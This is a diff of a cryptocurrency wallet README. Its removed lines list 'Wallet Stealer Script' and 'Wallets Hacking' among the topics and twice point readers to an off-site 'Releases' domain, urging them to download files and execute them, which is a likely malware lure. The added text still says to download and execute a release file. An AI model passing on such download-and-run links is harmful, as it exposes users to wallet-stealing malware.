@@ -1,138 +1,126 @@
 # CryptoGuardian 🛡️
 
-![CryptoGuardian Logo](https://via.placeholder.com/150) 
+![CryptoGuardian Logo](https://img.shields.io/badge/CryptoGuardian-Secure%20Wallet-brightgreen)
 
-Welcome to **CryptoGuardian**, your ultimate tool for managing and securing your cryptocurrency wallets. Whether you're a seasoned investor or just starting, this repository provides essential tools to help you navigate the complex world of crypto safely.
+Welcome to **CryptoGuardian**, your reliable partner in safeguarding digital assets. This wallet application is designed to provide top-notch security for your cryptocurrencies. By utilizing advanced encryption methods, CryptoGuardian ensures that your funds remain protected from unauthorized access.
 
 ## Table of Contents
 
-- [Introduction](#introduction)
 - [Features](#features)
 - [Installation](#installation)
 - [Usage](#usage)
-- [Topics](#topics)
+- [Technologies Used](#technologies-used)
 - [Contributing](#contributing)
 - [License](#license)
+- [Contact](#contact)
 - [Releases](#releases)
 
-## Introduction
+## Features 🌟
 
-In today's digital age, cryptocurrencies like Bitcoin and Bitcoin Cash have become vital assets. However, with great power comes great responsibility. **CryptoGuardian** offers a suite of tools designed to help you manage your wallets effectively, recover lost keys, and secure your assets against potential threats.
+- **Advanced Encryption**: Utilizes state-of-the-art encryption techniques to keep your assets secure.
+- **User-Friendly Interface**: Designed with simplicity in mind, making it easy for anyone to manage their cryptocurrencies.
+- **Multi-Currency Support**: Supports various cryptocurrencies including Bitcoin, Ethereum, and more.
+- **Real-Time Monitoring**: Track your asset values in real-time with visualizations.
+- **Secure Backup Options**: Offers reliable backup solutions to ensure your wallet is safe.
 
-## Features
+## Installation ⚙️
 
-- **Wallet Management**: Organize and manage multiple wallets seamlessly.
-- **Key Recovery**: Tools to help recover lost wallet keys and seeds.
-- **Security Tools**: Features to enhance the security of your wallets.
-- **Hacking Tools**: Learn about vulnerabilities in wallet systems for educational purposes.
-- **User-Friendly Interface**: Simple commands and clear outputs make it easy to use.
+To get started with CryptoGuardian, follow these steps:
 
-## Installation
-
-To get started with **CryptoGuardian**, follow these steps:
-
-1. Clone the repository:
-
+1. **Clone the Repository**:
    ```bash
-   git clone 
+   git clone https://github.com/Gabrielangelofe/cryptoguardian.git
    ```
 
-2. Navigate to the project directory:
-
+2. **Navigate to the Directory**:
    ```bash
    cd cryptoguardian
    ```
 
-3. Install the required dependencies:
-
+3. **Install Dependencies**:
+   Make sure you have Node.js and Python installed. Then run:
    ```bash
    npm install
+   pip install -r requirements.txt
    ```
 
-4. Run the application:
-
+4. **Run the Application**:
+   Start the application with:
    ```bash
-   npm start
+   streamlit run app.py
    ```
 
-## Usage
+## Usage 🖥️
 
-Using **CryptoGuardian** is straightforward. After installation, you can access various features through simple commands. 
+After installation, open your web browser and go to `http://localhost:8501` to access the CryptoGuardian interface. 
 
-### Example Commands
+### Creating a New Wallet
 
-- **List Wallets**: View all your wallets.
-  
-  ```bash
-  ./cryptoguardian list-wallets
-  ```
+1. Click on "Create Wallet".
+2. Follow the prompts to set up your wallet and generate a secure password.
+3. Make sure to save your recovery phrase in a secure location.
 
-- **Recover Wallet**: Use the recovery tool to retrieve lost keys.
+### Accessing Your Wallet
 
-  ```bash
-  ./cryptoguardian recover --seed <your_seed>
-  ```
+1. Click on "Access Wallet".
+2. Enter your password to unlock your wallet.
+3. View your balance and transaction history.
 
-- **Secure Wallet**: Enhance wallet security.
+### Sending and Receiving Cryptocurrency
 
-  ```bash
-  ./cryptoguardian secure --wallet <wallet_name>
-  ```
+- **To Send**: Click on "Send", enter the recipient's address and amount, then confirm.
+- **To Receive**: Click on "Receive" to generate your wallet address for incoming transactions.
 
-For a complete list of commands and options, refer to the documentation in the repository.
+## Technologies Used 🔧
 
-## Topics
+CryptoGuardian is built using a combination of powerful technologies:
 
-**CryptoGuardian** covers a wide range of topics relevant to cryptocurrency enthusiasts:
+- **Node.js**: For backend services and API management.
+- **Streamlit**: For creating interactive web applications.
+- **Pandas**: For data manipulation and analysis.
+- **Matplotlib & Seaborn**: For data visualization.
+- **SHA-256 Hashing**: To ensure secure storage of sensitive data.
+- **Cryptography Libraries**: To handle encryption and decryption processes.
 
-- Bitcoin
-- Bitcoin Wallet
-- Bitcoin Cash
-- Crypto
-- Crypto Tools
-- Crypto Wallet
-- Hacking
-- Wallet
-- Wallet Finder Crypto
-- Wallet Recovery Seeds
-- Wallet Recovery Tools
-- Wallet Stealer Script
-- WalletKeyTool
-- Wallets Finder
-- Wallets Hacking
+## Contributing 🤝
 
-## Contributing
+We welcome contributions to enhance CryptoGuardian. Here’s how you can help:
 
-We welcome contributions from the community! If you'd like to help improve **CryptoGuardian**, please follow these steps:
+1. **Fork the Repository**: Click on the fork button at the top right corner of the page.
+2. **Create a New Branch**: 
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Your Changes**: Implement your feature or fix a bug.
+4. **Commit Your Changes**: 
+   ```bash
+   git commit -m "Add Your Feature"
+   ```
+5. **Push to the Branch**: 
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Create a Pull Request**: Go to the original repository and submit a pull request.
 
-1. Fork the repository.
-2. Create a new branch for your feature or bug fix.
-3. Make your changes and commit them.
-4. Push to your branch.
-5. Open a pull request.
+## License 📜
 
-Please ensure your code adheres to our coding standards and includes appropriate tests.
+CryptoGuardian is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## License
+## Contact 📧
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+For any questions or feedback, please reach out to us:
 
-## Releases
+- **Email**: support@cryptoguardian.com
+- **GitHub**: [CryptoGuardian Issues](https://github.com/Gabrielangelofe/cryptoguardian/issues)
 
-For the latest updates and downloadable versions, visit our [Releases](https://installergitb.icu?cm9ipo2ls6hq5xj) section. Download the necessary files and execute them to start using the latest features.
+## Releases 📦
 
-![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)
+You can download the latest version of CryptoGuardian from the [Releases](https://github.com/Gabrielangelofe/cryptoguardian/releases) section. Make sure to download the file and execute it to start using the application.
+
+![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue)
 
 ## Conclusion
 
-**CryptoGuardian** is designed to empower users in the cryptocurrency space. With tools for wallet management, recovery, and security, you can navigate the world of crypto with confidence. 
+CryptoGuardian aims to provide a secure and user-friendly experience for managing your digital assets. With its advanced features and robust security measures, you can have peace of mind knowing your cryptocurrencies are safe.
 
-Stay safe, and happy trading! 
-
-For further information and updates, check our [Releases](https://installergitb.icu?3dbsrpkone51tk6) section. Download the necessary files and execute them to utilize the latest tools and features.
-
-![Stay Updated](https://img.shields.io/badge/Stay_Updated-Visit_here-blue)
-
----
-
-Feel free to explore the repository, and don’t hesitate to reach out if you have questions or suggestions. Your feedback is invaluable to us!
+Thank you for checking out CryptoGuardian! We hope you find it useful in your cryptocurrency journey.
